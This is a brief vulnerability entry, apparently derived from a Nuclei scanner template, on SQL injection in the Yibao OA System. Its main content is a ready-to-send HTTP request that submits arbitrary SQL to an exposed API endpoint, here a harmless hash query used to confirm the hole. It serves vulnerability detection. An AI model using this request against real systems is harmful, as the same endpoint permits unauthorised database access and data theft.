# Vulnerability: Yibao OA System - SQL Injection
**Classification:** YIBOO
**Source:** Nuclei Template (`yibao-sqli.yaml`)

## Description
Yibao OA System is vulnerable to SQL Injection.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /api/system/ExecuteSqlForSingle HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

token=zxh&sql=select substring(sys.fn_sqlvarbasetostr(HashBytes('MD5','{{num}}')),3,32)&strParameters
```

